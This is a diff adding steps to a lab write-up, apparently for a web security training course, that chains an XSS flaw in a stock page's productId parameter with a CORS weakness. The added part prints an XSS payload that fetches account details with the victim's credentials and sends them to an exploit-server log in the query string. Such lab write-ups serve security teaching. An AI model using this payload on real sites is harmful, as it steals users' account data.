@@ -231,6 +231,17 @@ From the above image we can see that a call to the <b>stock subdomain</b> is per
 So the productId parameter is prone to XSS attacks, we can take advantages of this vulnerability to exploit the CORS security lack. First of all we will test if we are able to get the account details information for the current user from the vulnerable stock web page hosted in the lab subdomain. We will delivery the following payload to try to get the account details for our current logged user (we must use credentials: 'include' in the fetch request to pass the credentials).
 -- 59 --
 Further we can see the response in the browser (right click in request section in the Repeater)
+-- 60 --
+Finally we craft the payload to be included in the exploit server, we have to direct the flow to the vulnerable stock page first, then we redirect the response containing the account details to the exploit server in the query string:
+-- 61 --
+As shown in the image above I encoded in URL format the actual payload passed as productID parameter (highlighted), for your convenience this is the plain version:
+```
+<script>
+fetch('https://0a6e004204f74b30c142e98100f9006b.web-security-academy.net/accountDetails', {credentials: 'include'})
+.then(response => response.text())
+.then((response) => document.location='https://exploit-0aa600e7048e4bcac12de85a010500dd.exploit-server.net/log?x='+response);</script>
+
+```
 
 
 References:
